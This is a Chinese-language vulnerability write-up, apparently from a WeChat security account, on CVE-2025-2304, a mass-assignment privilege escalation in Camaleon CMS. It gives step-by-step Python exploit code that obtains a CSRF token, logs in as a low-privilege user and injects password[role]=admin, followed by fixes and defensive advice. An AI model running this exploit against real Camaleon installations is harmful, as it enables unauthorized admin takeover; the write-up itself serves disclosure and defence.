---
cve: "CVE-2025-2304"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  [漏洞]CVE-2025-2304：Camaleon CMS 大规模赋值漏洞导致权限提升  
原创 niuko
                    niuko  Ncko   2026-06-21 01:30  
  
   
  
# [漏洞]CVE-2025-2304：Camaleon CMS 大规模赋值漏洞导致权限提升  
  
免责声明：  
  
由于传播、利用本公众号Ncko所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
## 漏洞简介  
  
CVE-2025-2304 是 Camaleon CMS（版本 < 2.9.1）中存在的一个严重的大规模赋值漏洞。该漏洞允许已认证的低权限用户通过操纵请求参数，将自身权限提升为管理员。  
  
漏洞根源在于 updated_ajax  
 接口未对用户提交的字段进行严格过滤，攻击者可以在更新个人资料的请求中注入 role  
 参数，将角色从普通用户修改为 admin  
，从而获得系统最高权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5LNgXJargeXkB5iaslQYqHpjcQY1jAnK6nXZAX4tSvzTDBOiamUZpxbeqlVbEqHykJexf2LqadNNQ8daDVRT0Gw8ceCsm0TexwRpZSQiayVN7g/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞原理分析  
### 什么是大规模赋值漏洞？  
  
大规模赋元漏洞是指应用程序在接收用户输入并自动将其绑定到对象属性时，未对可修改的字段进行限制。攻击者可以通过在请求中添加额外参数，修改本不应由用户控制的字段。  
### Camaleon CMS 中的具体问题  
  
在正常流程中，用户通过 /admin/users/{user_id}/updated_ajax  
 接口更新个人资料，提交的参数包括密码、确认密码等。但后端在处理时，直接将请求参数映射到用户对象，未过滤 role  
 字段。  
  
关键问题代码逻辑如下：  
```
# 漏洞利用时发送的恶意请求体payload = {    "_method": "patch",    "authenticity_token": csrf_token,    "password[password]": password,    "password[password_confirmation]": password,    "password[role]": "admin"  # ← 恶意注入的角色字段}
```  
  
后端接收到 password[role]  
 参数后，直接将其赋值给用户的 role  
 属性，导致普通用户瞬间变为管理员。  
### 利用流程  
```
```  
## 漏洞利用步骤详解  
### 1. 环境准备  
```
pip install requests beautifulsoup4
```  
### 2. 获取 CSRF Token  
  
脚本首先访问登录页面，通过解析 HTML 中的 <meta name="csrf-token">  
 标签获取 CSRF 令牌：  
```
url = f"http://{dom}:{port}/admin/login"req = session.get(url)soup = BeautifulSoup(req.text, 'html.parser')meta_tag = soup.find('meta', attrs={'name': 'csrf-token'})csrf_token = meta_tag.get('content')
```  
### 3. 低权限用户登录  
  
使用普通用户凭据进行认证，建立有效会话：  
```
creds = {    "authenticity_token": csrf_token,    "user[username]": user,    "user[password]": password}r = session.post(f"http://{dom}:{port}/admin/login", data=creds)
```  
### 4. 获取当前用户 ID  
  
访问个人资料编辑页面，从隐藏表单字段中提取用户 ID：  
```
url = f"http://{dom}:{port}/admin/profile/edit"req = session.get(url)soup = BeautifulSoup(req.text, 'html.parser')input_tag = soup.find('input', attrs={'name': 'user[id]'})user_id = input_tag.get("value")
```  
### 5. 注入恶意参数提权  
  
构造包含 role=admin  
 的请求发送至 updated_ajax  
 接口：  
```
url = f"http://{dom}:{port}/admin/users/{user_id}/updated_ajax"payload = {    "_method": "patch",    "authenticity_token": csrf_token,    "password[password]": password,    "password[password_confirmation]": password,    "password[role]": "admin"}ex = session.post(url, data=payload, headers={    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
```  
### 6. 验证提权结果  
  
访问 Dashboard 页面，检查是否包含 Administrator  
 关键字：  
```
dashboard_url = f"http://{dom}:{port}/admin/dashboard"req = session.get(dashboard_url)if "Administrator" in req.text:    print("[$] Successfully Escalated Privilege from Client to Admin...")
```  
## 漏洞影响评估  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">维度</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">评估</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">危害等级</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">严重</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">攻击复杂度</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">低</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">所需权限</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">低权限账户</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">用户交互</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">无需用户交互</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">影响范围</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">完整系统接管</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(15, 76, 129);"><span leaf="">CVSS 3.x</span></strong></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">8.8（High）</span></section></td></tr></tbody></table>  
## 修复建议  
### 官方修复  
  
升级 Camaleon CMS 至 **2.9.1 及以上版本**  
，官方已在新版本中对 updated_ajax  
 接口的参数进行白名单过滤。  
### 临时缓解措施  
1. 1. **参数白名单过滤**  
：在控制器层面对用户可修改的字段进行显式声明，拒绝接受 role  
 等敏感字段  
  
```
# Ruby on Rails 示例修复def updated_ajax  user_params = params.require(:password).permit(:password, :password_confirmation)  # 不再接受 role 参数  current_user.update(user_params)end
```  
1. 2. **接口访问控制**  
：限制 updated_ajax  
 接口仅允许用户修改自身非敏感信息  
  
1. 3. **WAF 规则**  
：在 Web 应用防火墙层面对请求参数进行检测，拦截包含 role  
 字段的异常请求  
  
1. 4. **权限审计**  
：定期审计系统中用户角色变更记录，发现异常提权行为  
  
## 防御思考  
  
大规模赋值漏洞是 Web 安全中常见但容易被忽视的问题。开发时应遵循以下原则：  
- • **最小暴露原则**  
：API 接口仅接收必要的参数，不使用批量赋值  
  
- • **白名单优先**  
：对用户输入字段使用白名单机制，而非黑名单  
  
- • **分层校验**  
：在控制器、模型、数据库多个层面进行字段权限控制  
  
- • **角色变更审计**  
：对关键权限变更操作记录日志并触发告警  
  
## 结尾总结  
  
CVE-2025-2304 再次提醒我们：**永远不要信任用户输入**  
。大规模赋值漏洞看似简单，但危害极大——一个低权限用户仅需一个 HTTP 请求就能接管整个系统。对于使用 Camaleon CMS 的团队，请尽快确认版本并升级。对于开发者，在编写任何更新接口时，务必对可修改字段进行严格的白名单控制。  
> 在公众号发送 **CVE-2025-2304**  
，即可获取对应项目链接。  
  
  
   
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
